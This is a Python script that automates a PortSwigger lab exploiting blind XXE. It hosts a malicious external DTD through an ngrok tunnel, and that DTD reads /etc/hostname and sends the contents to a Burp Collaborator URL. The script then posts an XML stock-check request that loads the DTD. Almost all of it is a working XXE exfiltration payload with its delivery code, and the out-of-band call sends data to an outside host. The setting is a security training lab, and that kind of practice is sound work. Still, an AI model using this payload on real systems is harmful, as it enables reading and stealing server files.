# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
# This script will auto exploit as Portswigger will not make request to server other than their exploit server...

import requests
import re
import sys
import bs4
import http.server
import socketserver
import argparse
from pyngrok import ngrok
import threading
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class request_handler(http.server.BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        if self.path == "/malicious.dtd":
            self._set_response()

            # Payload
            payload = """<!ENTITY % file SYSTEM "file:///etc/hostname">
            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{}/?x=%file;'>">
            %eval;
            %exfiltrate;""".format(burp_collab_url)

            print(payload)
            self.wfile.write(payload.encode("utf-8"))
            print("[+] External Malicious DTD Accessed")
            raise KeyboardInterrupt

def server():
    try:
        httpd = socketserver.TCPServer((attacker_ip, attacker_port), request_handler)
        print("[+] Hosted External Malicious DTD")
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()

def xxe_injection():
    url = target_url + "/product/stock"

    http_tunnel = ngrok.connect(attacker_port,"http",bind_tls=True)
    public_url = http_tunnel.public_url

    data = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{}/malicious.dtd"> %xxe; ]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>
    """.format(public_url)

    out = r.post(url, data=data, verify=False, proxies=proxies)
    print(out.status_code)
    print(out.content)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True)
    parser.add_argument('--burpcollab', type=str, required=True)
    args = parser.parse_args()

    target_url = args.host
    burp_collab_url = args.burpcollab
    attacker_ip = "localhost"
    attacker_port = 9999

    r = requests.Session()
    proxies = {
        'https':'http://127.0.0.1:8080',
        'http':'http://127.0.0.1:8080'
    }

    server_thread = threading.Thread(target=server)
    server_thread.start()
    xxe_injection()